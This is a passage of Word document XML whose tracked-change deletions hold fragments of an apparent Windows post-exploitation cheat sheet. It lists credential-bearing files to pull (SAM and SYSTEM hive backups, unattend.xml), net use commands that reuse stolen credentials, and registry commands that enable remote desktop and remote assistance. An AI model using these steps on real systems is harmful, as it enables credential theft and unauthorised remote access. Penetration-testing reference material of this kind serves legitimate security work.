    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007CB">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pm3tqdphxn5g" w:id="303"/>
          <w:bookmarkEnd w:id="303"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007CC">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m1i12nxzoxnd" w:id="304"/>
          <w:bookmarkEnd w:id="304"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007CD">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bj99fth4v3e5" w:id="305"/>
          <w:bookmarkEnd w:id="305"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007CE">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zg5f1i4k5e2i" w:id="306"/>
          <w:bookmarkEnd w:id="306"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007CF">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5yrawsxh0nsn" w:id="307"/>
          <w:bookmarkEnd w:id="307"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007D0">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29quhodzqdmr" w:id="308"/>
          <w:bookmarkEnd w:id="308"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007D1">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uwv4eta35w9a" w:id="309"/>
          <w:bookmarkEnd w:id="309"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007D2">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dfnyf6rsn6lk" w:id="310"/>
          <w:bookmarkEnd w:id="310"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007D3">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u950xwu8cxip" w:id="311"/>
          <w:bookmarkEnd w:id="311"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007D4">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wjm76ei9sm1l" w:id="312"/>
          <w:bookmarkEnd w:id="312"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007D5">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2clq1ywyuv9a" w:id="313"/>
          <w:bookmarkEnd w:id="313"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007D6">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78mf1fsmhflt" w:id="314"/>
          <w:bookmarkEnd w:id="314"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007D7">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ls3w7vcx18up" w:id="315"/>
          <w:bookmarkEnd w:id="315"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007D8">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1wjdcodyh61n" w:id="316"/>
          <w:bookmarkEnd w:id="316"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007D9">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1ee6dqhhstbp" w:id="317"/>
          <w:bookmarkEnd w:id="317"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007DA">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1r9lqbq4l4gj" w:id="318"/>
          <w:bookmarkEnd w:id="318"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007DB">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mks8auuns4lv" w:id="319"/>
          <w:bookmarkEnd w:id="319"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007DC">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t2pa71mc2f8" w:id="320"/>
          <w:bookmarkEnd w:id="320"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007DD">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l696kii1g66d" w:id="321"/>
          <w:bookmarkEnd w:id="321"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007DE">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ykbatogj9rut" w:id="322"/>
          <w:bookmarkEnd w:id="322"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007DF">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l4r7n5ilizlm" w:id="323"/>
          <w:bookmarkEnd w:id="323"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007E0">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81hvy4byis5p" w:id="324"/>
          <w:bookmarkEnd w:id="324"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007E1">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gap5gpph4k4a" w:id="325"/>
          <w:bookmarkEnd w:id="325"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007E2">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4nqgtbgkn9ir" w:id="326"/>
          <w:bookmarkEnd w:id="326"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007E3">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ihuoalc0e55b" w:id="327"/>
          <w:bookmarkEnd w:id="327"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007E4">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rdoy1ctmzjgm" w:id="328"/>
          <w:bookmarkEnd w:id="328"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007E5">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13zb37km2eth" w:id="329"/>
          <w:bookmarkEnd w:id="329"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007E6">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y6i2ihc7h660" w:id="330"/>
          <w:bookmarkEnd w:id="330"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007E7">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npsrjw6v6jmg" w:id="331"/>
          <w:bookmarkEnd w:id="331"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007E8">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6xikh8xr1mcf" w:id="332"/>
          <w:bookmarkEnd w:id="332"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007E9">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jzbt3vtoq8ri" w:id="333"/>
          <w:bookmarkEnd w:id="333"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007EA">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:pBdr>
          <w:top w:space="0" w:sz="0" w:val="nil"/>
          <w:left w:space="0" w:sz="0" w:val="nil"/>
          <w:bottom w:space="0" w:sz="0" w:val="nil"/>
          <w:right w:space="0" w:sz="0" w:val="nil"/>
          <w:between w:space="0" w:sz="0" w:val="nil"/>
        </w:pBdr>
        <w:shd w:fill="auto" w:val="clear"/>
        <w:rPr>
          <w:ins w:author="Anonymous" w:id="27" w:date="2019-07-09T22:42:56Z"/>
          <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:smallCaps w:val="0"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:smallCaps w:val="0"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:ins w:author="Anonymous" w:id="27" w:date="2019-07-09T22:42:56Z">
        <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
          <w:bookmarkStart w:colFirst="0" w:colLast="0" w:name="_w14ojfx4yc9z" w:id="334"/>
          <w:bookmarkEnd w:id="334"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007EB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>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Change w:author="Anonymous" w:id="0" w:date="2019-07-09T22:42:56Z">
          <w:pPr>
            <w:pStyle w:val="Heading2"/>
            <w:keepNext w:val="0"/>
            <w:keepLines w:val="0"/>
            <w:widowControl w:val="0"/>
            <w:pBdr>
              <w:top w:space="0" w:sz="0" w:val="nil"/>
              <w:left w:space="0" w:sz="0" w:val="nil"/>
              <w:bottom w:space="0" w:sz="0" w:val="nil"/>
              <w:right w:space="0" w:sz="0" w:val="nil"/>
              <w:between w:space="0" w:sz="0" w:val="nil"/>
            </w:pBdr>
            <w:shd w:fill="auto" w:val="clear"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:bookmarkStart w:colFirst="0" w:colLast="0" w:name="_ufpocum8urv" w:id="258"/>
        <w:bookmarkEnd w:id="258"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve"> To Pull (if possible)</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>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8"/>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5"/>
        <w:gridCol w:w="3105"/>
        <w:tblGridChange w:id="0">
          <w:tblGrid>
            <w:gridCol w:w="7175"/>
            <w:gridCol w:w="3105"/>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File location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Description / Reason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%SYSTEMDRIVE%\pagefile.sys</w:delText>
              </w:r>
            </w:del>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Large file, but contains spill over from RAM, usually lots of good information can be pulled, but should be a last resort due to size</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%WINDIR%\debug\NetSetup.log</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%WINDIR%\repair\sam</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%WINDIR%\repair\system</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%WINDIR%\repair\software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%WINDIR%\repair\security</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%WINDIR%\iis6.log (5, 6 or 7)</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%WINDIR%\system32\logfiles\httperr\httperr1.log</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IIS 6 error log</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%SystemDrive%\inetpub\logs\LogFiles </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IIS 7’s logs location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%WINDIR%\system32\logfiles\w3svc1\exYYMMDD.log (year month day)</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%WINDIR%\system32\config\AppEvent.Evt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%WINDIR%\system32\config\SecEvent.Evt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%WINDIR%\system32\config\default.sav</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%WINDIR%\system32\config\security.sav</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%WINDIR%\system32\config\software.sav</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%WINDIR%\system32\config\system.sav</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%WINDIR%\system32\CCM\logs\*.log</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trHeight w:val="50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%USERPROFILE%\ntuser.dat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%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat</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%WINDIR%\System32\drivers\etc\hosts</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unattend.txt, unattend.xml, sysprep.inf</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Used in the automated deployment of windows images and can contain user accounts. Usually found in %WINDIR%\Panther\ or %WINDIR%\Panther\Unattend\ also in Registry at HKLM\System\Setup!UnattendFile</w:delText>
              </w:r>
            </w:del>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>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1C">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>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7khdkf91zisc" w:id="335"/>
        <w:bookmarkEnd w:id="335"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">Remote System Access</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:tab/>
        </w:r>
      </w:del>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19"/>
        <w:tblW w:w="102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5715"/>
        <w:tblGridChange w:id="0">
          <w:tblGrid>
            <w:gridCol w:w="4575"/>
            <w:gridCol w:w="5715"/>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Comman</w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr/>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">d</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Description / Reason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share \\computername</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tasklist /V /S computername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qwinsta /SERVER:computername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qprocess /SERVER:computername *</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 \\computername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This maps IPC$ which does not show up as a drive but allows you to access the remote system as the current user. This is less helpful as most commands will automatically make this connection if needed</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 \\computername /user:DOMAIN\username password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Using the IPC$ mount use a user name and password allows you to access commands that do not usually ask for a username and password as a different user in the context of the remote system.</w:delText>
              </w:r>
            </w:del>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This is useful when you’ve gotten credentials from somewhere and wish to use them but do not have an active token on a machine you have a session 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reg add "HKEY_LOCAL_MACHINE\SYSTEM\</w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr/>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">CurrentControlSet</w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr/>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f</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ins w:author="Alpha Cyber Security" w:id="31" w:date="2019-09-11T18:08:17Z">
              <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
                <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                  <w:rPr>
                    <w:u w:val="single"/>
                    <w:rtl w:val="0"/>
                    <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                      <w:rPr/>
                    </w:rPrChange>
                  </w:rPr>
                  <w:delText xml:space="preserve">CurrentControlSet</w:delText>
                </w:r>
              </w:del>
            </w:ins>
            <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr/>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">Enable remote desktop.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reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f</w:delText>
              </w:r>
            </w:del>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Enable remote </w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr/>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">assistance</w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:rtl w:val="0"/>
                </w:rPr>
              </w:r>
            </w:del>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>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34">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rPr>
          <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
        </w:rPr>
        <w:pPrChange w:author="Anonymous" w:id="0" w:date="2019-11-04T09:54:30Z">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time \\computername (Shows the time of target computer)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000835">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rPr>
          <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
        </w:rPr>
        <w:pPrChange w:author="Anonymous" w:id="0" w:date="2019-11-04T09:54:30Z">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dir \\computername\share_or_admin_share\   (dir list a remote directory)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000836">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rPr>
          <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
        </w:rPr>
        <w:pPrChange w:author="Anonymous" w:id="0" w:date="2019-11-04T09:54:30Z">
          <w:pPr>
            <w:keepNext w:val="0"/>
            <w:keepLines w:val="0"/>
            <w:widowControl w:val="0"/>
            <w:numPr>
              <w:ilvl w:val="0"/>
              <w:numId w:val="77"/>
            </w:numPr>
            <w:pBdr>
              <w:top w:space="0" w:sz="0" w:val="nil"/>
              <w:left w:space="0" w:sz="0" w:val="nil"/>
              <w:bottom w:space="0" w:sz="0" w:val="nil"/>
              <w:right w:space="0" w:sz="0" w:val="nil"/>
              <w:between w:space="0" w:sz="0" w:val="nil"/>
            </w:pBdr>
            <w:shd w:fill="auto" w:val="clear"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
            </w:tabs>
            <w:ind w:left="72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tasklist /V /S computername</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000837">
      <w:pPr>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="77"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:space="0" w:sz="0" w:val="nil"/>
          <w:left w:space="0" w:sz="0" w:val="nil"/>
          <w:bottom w:space="0" w:sz="0" w:val="nil"/>
          <w:right w:space="0" w:sz="0" w:val="nil"/>
          <w:between w:space="0" w:sz="0" w:val="nil"/>
        </w:pBdr>
        <w:shd w:fill="auto" w:val="clear"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
        <w:rPr>
          <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
        </w:rPr>
        <w:pPrChange w:author="Anonymous" w:id="0" w:date="2019-11-04T09:54:30Z">
          <w:pPr>
            <w:keepNext w:val="0"/>
            <w:keepLines w:val="0"/>
            <w:widowControl w:val="0"/>
            <w:numPr>
              <w:ilvl w:val="1"/>
              <w:numId w:val="77"/>
            </w:numPr>
            <w:pBdr>
              <w:top w:space="0" w:sz="0" w:val="nil"/>
              <w:left w:space="0" w:sz="0" w:val="nil"/>
              <w:bottom w:space="0" w:sz="0" w:val="nil"/>
              <w:right w:space="0" w:sz="0" w:val="nil"/>
              <w:between w:space="0" w:sz="0" w:val="nil"/>
            </w:pBdr>
            <w:shd w:fill="auto" w:val="clear"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="216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Lists tasks w/users running those tasks on a remote system. This will remove any IPC$ connection after it is done so if you are using another user, you need to re-initiate the IPC$ mount</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000838">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yz8d0rpmjxav" w:id="336"/>
        <w:bookmarkEnd w:id="336"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">Auto-Start Directories</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000839">
      <w:pPr>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="138"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:space="0" w:sz="0" w:val="nil"/>
          <w:left w:space="0" w:sz="0" w:val="nil"/>
          <w:bottom w:space="0" w:sz="0" w:val="nil"/>
          <w:right w:space="0" w:sz="0" w:val="nil"/>
          <w:between w:space="0" w:sz="0" w:val="nil"/>
        </w:pBdr>
        <w:shd w:fill="auto" w:val="clear"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
        <w:rPr>
          <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
        </w:rPr>
        <w:pPrChange w:author="Anonymous" w:id="0" w:date="2019-11-04T09:54:30Z">
          <w:pPr>
            <w:keepNext w:val="0"/>
            <w:keepLines w:val="0"/>
            <w:widowControl w:val="0"/>
            <w:numPr>
              <w:ilvl w:val="0"/>
              <w:numId w:val="138"/>
